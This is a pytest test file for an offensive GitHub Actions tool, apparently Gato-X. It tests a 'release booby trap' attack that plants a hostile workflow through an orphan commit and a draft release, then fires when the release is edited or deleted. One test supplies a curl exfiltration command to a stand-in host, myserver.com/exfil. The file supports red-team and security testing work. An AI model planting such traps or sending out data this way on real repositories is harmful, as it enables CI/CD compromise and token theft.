import re
from unittest.mock import AsyncMock, MagicMock, patch

import httpx

from gatox.attack.cicd.release_booby_trap import ReleaseBoobyTrapAttack
from gatox.github.api import Api


def escape_ansi(line):
    ansi_escape = re.compile(r"(?:\x1B[@-_]|[\x80-\x9F])[0-?]*[ -/]*[@-~]")
    return ansi_escape.sub("", line)


# ---- Payload generation tests ----


def test_create_release_booby_trap_yml_defaults():
    """Test default payload YAML generation."""
    yaml_str = ReleaseBoobyTrapAttack.create_release_booby_trap_yml()

    assert "Release Booby Trap" in yaml_str
    assert "release" in yaml_str
    assert "edited" in yaml_str
    assert "deleted" in yaml_str
    assert "id-token" in yaml_str
    assert "contents" in yaml_str
    assert "ubuntu-latest" in yaml_str
    assert "example.com/booby-trap-detonated" in yaml_str
    assert "[BOOBY_TRAP]" in yaml_str


def test_create_release_booby_trap_yml_custom_sink():
    """Test payload with a custom exfil sink."""
    yaml_str = ReleaseBoobyTrapAttack.create_release_booby_trap_yml(
        exfil_sink="curl https://myserver.com/exfil -d @-",
    )

    assert "myserver.com/exfil" in yaml_str
    assert "example.com" not in yaml_str


def test_create_release_booby_trap_yml_custom_permissions():
    """Test payload with custom permissions."""
    yaml_str = ReleaseBoobyTrapAttack.create_release_booby_trap_yml(
        permissions={"id-token": "write", "contents": "write", "actions": "write"},
    )

    assert "actions: write" in yaml_str


def test_load_payload_from_file(tmp_path):
    """Test loading a payload from a file."""
    payload_content = "name: Custom Payload\non: [release]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo test\n"
    payload_file = tmp_path / "custom_payload.yml"
    payload_file.write_text(payload_content)

    loaded = ReleaseBoobyTrapAttack.load_payload_from_file(str(payload_file))
    assert loaded == payload_content


# ---- Happy-path plant tests ----


def _make_mock_response(status_code, json_data, headers=None):
    """Build a mock httpx.Response."""
    resp = MagicMock(spec=httpx.Response)
    resp.status_code = status_code
    resp.json.return_value = json_data
    resp.headers = headers or {}
    return resp


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_happy_path(mock_api, capsys):
    """Test the full plant flow — happy path."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["repo", "workflow"],
    }

    # Blob creation
    mock_api.return_value.call_post.side_effect = [
        _make_mock_response(201, {"sha": "abc1234blob"}),
        _make_mock_response(201, {"sha": "def5678tree"}),
        _make_mock_response(201, {"sha": "9999999orphan"}),
        _make_mock_response(
            201,
            {
                "id": 42,
                "html_url": "https://github.com/testUser/targetRepo/releases/tag/booby-trap-abcdef",
            },
        ),
    ]
    # PATCH response
    mock_api.return_value.call_patch.return_value = _make_mock_response(
        200, {"id": 42}
    )

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap("testUser/targetRepo")

    assert result is not None
    assert result["orphan_sha"] == "9999999orphan"
    assert result["release_id"] == 42
    assert "targetRepo/releases" in result["release_url"]

    captured = capsys.readouterr()
    output = escape_ansi(captured.out)

    assert "Release Booby Trap planted successfully" in output
    assert "9999999orphan" in output
    assert "Trap fires when a non-bot actor" in output

    # Verify API call sequence
    call_urls = [call[0][0] for call in mock_api.return_value.call_post.call_args_list]
    assert "/git/blobs" in call_urls[0]
    assert "/git/trees" in call_urls[1]
    assert "/git/commits" in call_urls[2]
    assert "/releases" in call_urls[3]

    mock_api.return_value.call_patch.assert_called_once()


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_with_publish(mock_api, capsys):
    """Test the plant flow with publish enabled."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["repo", "workflow"],
    }

    mock_api.return_value.call_post.side_effect = [
        _make_mock_response(201, {"sha": "abc1234blob"}),
        _make_mock_response(201, {"sha": "def5678tree"}),
        _make_mock_response(201, {"sha": "9999999orphan"}),
        _make_mock_response(
            201,
            {
                "id": 42,
                "html_url": "https://github.com/testUser/targetRepo/releases/tag/test",
            },
        ),
    ]
    mock_api.return_value.call_patch.return_value = _make_mock_response(
        200, {"id": 42}
    )

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap(
        "testUser/targetRepo", publish=True
    )

    assert result is not None

    # Verify PATCH included draft=false
    patch_call = mock_api.return_value.call_patch.call_args
    assert patch_call[1]["params"]["draft"] is False

    captured = capsys.readouterr()
    output = escape_ansi(captured.out)
    assert "Release published" in output


# ---- Dry-run tests ----


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_dry_run(mock_api, capsys):
    """Test the dry-run path — no API calls made."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["repo", "workflow"],
    }

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap(
        "testUser/targetRepo", dry_run=True
    )

    assert result is not None
    assert result["orphan_sha"] == "dry-run-orphan-sha"
    assert result["release_id"] == 0

    captured = capsys.readouterr()
    output = escape_ansi(captured.out)

    assert "DRY RUN" in output
    assert "[DRY RUN] POST" in output
    assert "[DRY RUN] PATCH" in output

    # No actual API calls
    mock_api.return_value.call_post.assert_not_called()
    mock_api.return_value.call_patch.assert_not_called()


# ---- Insufficient permissions test ----


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_bad_perms(mock_api, capsys):
    """Test failure when token lacks necessary scopes."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["gist"],  # No repo or workflow scope
    }

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap("testUser/targetRepo")

    assert result is None

    captured = capsys.readouterr()
    output = escape_ansi(captured.out)
    assert "does not have the necessary scopes" in output


# ---- Partial failure cleanup tests ----


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_patch_failure_cleanup(mock_api, capsys):
    """Test cleanup when PATCH fails — deletes the draft release."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["repo", "workflow"],
    }

    # All POSTs succeed but PATCH fails
    mock_api.return_value.call_post.side_effect = [
        _make_mock_response(201, {"sha": "abc1234blob"}),
        _make_mock_response(201, {"sha": "def5678tree"}),
        _make_mock_response(201, {"sha": "9999999orphan"}),
        _make_mock_response(
            201,
            {
                "id": 42,
                "html_url": "https://github.com/testUser/targetRepo/releases/tag/test",
            },
        ),
    ]
    mock_api.return_value.call_patch.return_value = _make_mock_response(
        422, {}  # Unprocessable entity
    )
    mock_api.return_value.call_delete.return_value = _make_mock_response(
        204, {}
    )

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap("testUser/targetRepo")

    assert result is None

    captured = capsys.readouterr()
    output = escape_ansi(captured.out)

    assert "Failed to PATCH release" in output
    assert "Cleaning up draft release 42" in output

    # Verify cleanup called
    mock_api.return_value.call_delete.assert_called_once_with(
        "/repos/testUser/targetRepo/releases/42"
    )


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_blob_failure(mock_api, capsys):
    """Test failure at blob creation step."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["repo", "workflow"],
    }

    mock_api.return_value.call_post.return_value = _make_mock_response(
        422, {"message": "Validation Failed"}
    )

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap("testUser/targetRepo")

    assert result is None

    captured = capsys.readouterr()
    output = escape_ansi(captured.out)
    assert "Failed to create blob" in output


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_release_failure(mock_api, capsys):
    """Test failure at draft release creation step."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["repo", "workflow"],
    }

    mock_api.return_value.call_post.side_effect = [
        _make_mock_response(201, {"sha": "abc1234blob"}),
        _make_mock_response(201, {"sha": "def5678tree"}),
        _make_mock_response(201, {"sha": "9999999orphan"}),
        _make_mock_response(403, {"message": "Forbidden"}),
    ]

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap("testUser/targetRepo")

    assert result is None

    captured = capsys.readouterr()
    output = escape_ansi(captured.out)
    assert "Failed to create draft release" in output


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_custom_payload(mock_api, tmp_path, capsys):
    """Test planting with a custom payload from file."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["repo", "workflow"],
    }

    payload_content = (
        "name: Custom Bomb\non:\n  release:\n    types: [edited]\n"
        "jobs:\n  fire:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: echo custom\n"
    )
    payload_file = tmp_path / "custom_bomb.yml"
    payload_file.write_text(payload_content)

    mock_api.return_value.call_post.side_effect = [
        _make_mock_response(201, {"sha": "abc1234blob"}),
        _make_mock_response(201, {"sha": "def5678tree"}),
        _make_mock_response(201, {"sha": "9999999orphan"}),
        _make_mock_response(
            201,
            {
                "id": 42,
                "html_url": "https://github.com/testUser/targetRepo/releases/tag/test",
            },
        ),
    ]
    mock_api.return_value.call_patch.return_value = _make_mock_response(
        200, {"id": 42}
    )

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap(
        "testUser/targetRepo", payload_path=str(payload_file)
    )

    assert result is not None

    # Verify blob content matches the custom payload
    blob_call = mock_api.return_value.call_post.call_args_list[0]
    assert blob_call[1]["params"]["content"] == payload_content


# ---- Dry-run skips permission check ----


@patch("gatox.attack.attack.Api", return_value=AsyncMock(Api))
async def test_plant_release_booby_trap_dry_run_skips_perms(mock_api, capsys):
    """Test dry-run skips the permission check."""
    mock_api.return_value.check_user.return_value = {
        "user": "testUser",
        "name": "test user",
        "scopes": ["gist"],  # insufficient scope normally
    }

    attacker = ReleaseBoobyTrapAttack(
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        socks_proxy=None,
        http_proxy="localhost:8080",
    )

    result = await attacker.plant_release_booby_trap(
        "testUser/targetRepo", dry_run=True
    )

    # Dry-run should succeed despite insufficient scopes
    assert result is not None
    assert result["orphan_sha"] == "dry-run-orphan-sha"
